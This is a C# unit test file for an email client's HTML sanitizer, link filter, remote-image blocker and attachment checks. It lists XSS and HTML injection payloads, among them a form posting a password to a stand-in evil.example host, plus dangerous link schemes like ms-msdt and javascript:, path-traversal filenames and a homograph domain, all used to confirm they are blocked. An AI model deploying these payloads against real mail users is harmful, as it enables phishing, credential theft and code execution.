using ThixMail.Core.Mime;
using ThixMail.Core.Security;
using ThixWrite.Core.Documents;
using ThixWrite.Core.Model;
using static ThixMail.Core.Tests.TestData;

namespace ThixMail.Core.Tests;

/// <summary>The safety of shown mail: a table of attacks, remote pictures, links, attachments.</summary>
public sealed class SafetyTests
{
    private static readonly DocumentFonts Fonts = new("Arial", "Arial");

    public static TheoryData<string, string, string> Attacks => new()
    {
        { "script", "<p>Text</p><script>alert('x')</script>", "alert" },
        { "script in a comment trick", "<p>Text</p><!--><script>alert(1)</script>-->", "alert" },
        { "style sheet", "<style>body{background:url(https://evil.example/x)}</style><p>Text</p>", "evil" },
        { "iframe", "<p>Text</p><iframe src=\"https://evil.example/\">innen</iframe>", "innen" },
        { "iframe srcdoc", "<p>Text</p><iframe srcdoc=\"<script>alert(1)</script>\"></iframe>", "alert" },
        { "object", "<p>Text</p><object data=\"https://evil.example/x.swf\">fallback</object>", "fallback" },
        { "embed", "<p>Text</p><embed src=\"https://evil.example/x\">", "evil" },
        { "form", "<form action=\"https://evil.example/steal\"><input name=\"pw\" value=\"Kennwort\"><button>Senden</button></form><p>Text</p>", "Kennwort" },
        { "svg onload", "<p>Text</p><svg onload=\"alert(1)\"><text>svgtext</text></svg>", "svgtext" },
        { "meta refresh", "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\"><p>Text</p>", "evil" },
        { "event handler", "<p onclick=\"alert(1)\">Text</p>", "alert" },
        { "math", "<p>Text</p><math><mtext>mathtext</mtext></math>", "mathtext" },
        { "template", "<p>Text</p><template><p>versteckt</p></template>", "versteckt" },
        { "noscript", "<p>Text</p><noscript>noscripttext</noscript>", "noscripttext" },
        { "hidden preheader", "<div style=\"display:none\">Vorschautext</div><p>Text</p>", "Vorschautext" },
        { "mso hide", "<div style=\"mso-hide:all\">msotext</div><p>Text</p>", "msotext" },
        { "hidden by a style sheet", "<style>.pre{display:none}</style><div class=\"pre\">klassentext</div><p>Text</p>", "klassentext" },
        { "style sheet import", "<style>@import url(https://evil.example/x.css); p{color:red}</style><p>Text</p>", "evil" },
    };

    [Theory]
    [MemberData(nameof(Attacks))]
    public void Nothing_of_an_attack_shows_or_runs(string name, string html, string forbidden)
    {
        var view = MailHtml.ToView(new ReadMail { Html = html }, 500, null, Fonts);
        var text = view.Document.GetPlainText();
        Assert.Contains("Text", text, StringComparison.Ordinal);
        Assert.DoesNotContain(forbidden, text, StringComparison.Ordinal);
        Assert.Empty(view.BlockedImages);
        Assert.True(name.Length > 0);
    }

    public static TheoryData<string> BadLinks => new()
    {
        "javascript:alert(1)",
        "JaVaScRiPt:alert(1)",
        "  javascript:alert(1)",
        "vbscript:msgbox(1)",
        "data:text/html,<script>alert(1)</script>",
        "file:///C:/Windows/System32/calc.exe",
        "\\\\server\\share\\virus.exe",
        "ms-msdt:/id PCWDiagnostic",
        "search-ms:query=x",
        "relative/path.html",
    };

    [Theory]
    [MemberData(nameof(BadLinks))]
    public void Only_web_and_mail_links_survive(string href)
    {
        var view = MailHtml.ToView(new ReadMail { Html = $"<p><a href=\"{href}\">Klick</a> <a href=\"https://ok.example/\">gut</a></p>" }, 500, null, Fonts);
        Assert.Equal(["https://ok.example/"], view.Links);
        Assert.Null(MailHtml.DescribeLink(href));
    }

    [Fact]
    public void Remote_pictures_are_blocked_until_loaded_and_cid_pictures_show_at_once()
    {
        var mail = MailReader.Read(Fixture("03-newsletter.eml"));
        var blocked = MailHtml.ToView(mail, 600, null, Fonts);
        Assert.Equal(4, blocked.BlockedImages.Count); // logo, two products, the tracking pixel (counted, never fetched)
        Assert.DoesNotContain(MailHtml.AllInlines(blocked.Document.Blocks), i => i is ImageInline);
        Assert.DoesNotContain("Die Neuheiten im November", blocked.Document.GetPlainText(), StringComparison.Ordinal); // hidden preheader
        Assert.DoesNotContain("javascript", string.Join(" ", blocked.Links), StringComparison.Ordinal);

        var png = MailReader.Read(Fixture("05-inline-image.eml")).InlineParts.Values.Single().Bytes;
        var loaded = MailHtml.ToView(mail, 600, blocked.BlockedImages.ToDictionary(s => s, _ => png), Fonts);
        Assert.Equal(3, MailHtml.AllInlines(loaded.Document.Blocks).OfType<ImageInline>().Count()); // the 1×1 pixel never shows
        Assert.Empty(loaded.BlockedImages);

        var inline = MailHtml.ToView(MailReader.Read(Fixture("05-inline-image.eml")), 600, null, Fonts);
        Assert.Single(inline.Document.Blocks.OfType<Paragraph>().SelectMany(p => p.Inlines).OfType<ImageInline>());
        Assert.Empty(inline.BlockedImages);
    }

    [Fact]
    public async Task Remote_pictures_are_fetched_only_as_real_pictures_and_within_limits()
    {
        var png = MailReader.Read(Fixture("05-inline-image.eml")).InlineParts.Values.Single().Bytes;
        RemotePictures.FetchForTests = (source, _) => Task.FromResult<byte[]?>(source.Contains("fake", StringComparison.Ordinal) ? "<html>no picture</html>"u8.ToArray() : png);
        try
        {
            var result = await RemotePictures.FetchAsync(["https://a.example/1.png", "https://a.example/fake.png", "file:///C:/x.png", "https://a.example/1.png"], CancellationToken.None);
            Assert.Equal(["https://a.example/1.png"], result.Keys);
        }
        finally
        {
            RemotePictures.FetchForTests = null;
        }
    }

    [Fact]
    public void A_link_shows_its_real_target_and_an_imitating_host_in_ASCII()
    {
        Assert.Equal("https://example.de/konto?x=1", MailHtml.DescribeLink("https://example.de/konto?x=1"));
        Assert.Equal("https://xn--pypal-4ve.com/login", MailHtml.DescribeLink("https://pаypal.com/login")); // a Cyrillic а
        Assert.Equal("E-Mail an anna@example.de", MailHtml.DescribeLink("mailto:anna@example.de?subject=Hallo"));
    }

    [Theory]
    [InlineData("Rechnung.pdf", false)]
    [InlineData("Foto.JPG", false)]
    [InlineData("setup.exe", true)]
    [InlineData("Rechnung.pdf.exe", true)]
    [InlineData("Rechnung.pdf.exe.", true)]
    [InlineData("script.PS1", true)]
    [InlineData("Makro.xlsm", true)]
    [InlineData("Verknüpfung.lnk", true)]
    [InlineData("image.iso", true)]
    [InlineData("tool.command", true)]
    public void Attachments_that_could_run_code_are_recognized(string name, bool executable) =>
        Assert.Equal(executable, AttachmentSafety.IsExecutable(name));

    [Fact]
    public void Attachment_names_never_name_a_folder()
    {
        Assert.Equal("evil.exe", MailReader.Sanitize("..\\..\\Windows\\evil.exe"));
        Assert.Equal("passwd", MailReader.Sanitize("/etc/passwd"));
        Assert.Equal("a_b_c.txt", MailReader.Sanitize("a:b*c.txt"));
        Assert.Equal("Anlage", MailReader.Sanitize("..."));
    }

    [Fact]
    public void Newsletters_keep_their_columns_their_style_sheets_and_their_links()
    {
        var columns = MailHtml.ToView(MailReader.Read(Fixture("14-newsletter-columns.eml")), 600, null, Fonts);
        var carrier = columns.Document.Blocks.OfType<Paragraph>().Select(p => p.Inlines).First(inlines => inlines is [OpaqueInline { Nested: { } nested }] && MailHtml.AllInlines(nested.Blocks).Any(i => i is ImageInline));
        var products = TableSpan.All(new Document(((OpaqueInline)carrier[0]).Nested!.Blocks)).Single().Table;
        Assert.Equal(3, products.Rows[0].CellCount); // three products side by side
        Assert.Equal(3, MailHtml.AllInlines(columns.Document.Blocks).OfType<ImageInline>().Count());
        Assert.Contains("https://news.example.org/beeren", columns.Links);
        Assert.DoesNotContain("Drei neue Sorten für den Winter", columns.Document.GetPlainText(), StringComparison.Ordinal); // hidden preheader

        var order = MailHtml.ToView(MailReader.Read(Fixture("13-order-confirmation.eml")), 600, null, Fonts);
        Assert.DoesNotContain("nur Telefone", order.Document.GetPlainText(), StringComparison.Ordinal); // .mobile-only {display:none}, @media left out
        var brand = MailHtml.AllInlines(order.Document.Blocks).OfType<TextRun>().First(run => run.Text.Contains("Kaffeerösterei Beispiel", StringComparison.Ordinal));
        Assert.Equal("FFFFFF", brand.Properties.Color!.Value); // .brand td { color:#FFFFFF } from the style sheet

        var outlook = MailHtml.ToView(MailReader.Read(Fixture("12-outlook-html.eml")), 600, null, Fonts);
        var signature = TableSpan.All(outlook.Document).Single().Table;
        Assert.True(signature.Grid.Sum() < 300, $"the signature takes {signature.Grid.Sum()} pt of 600");
    }
}
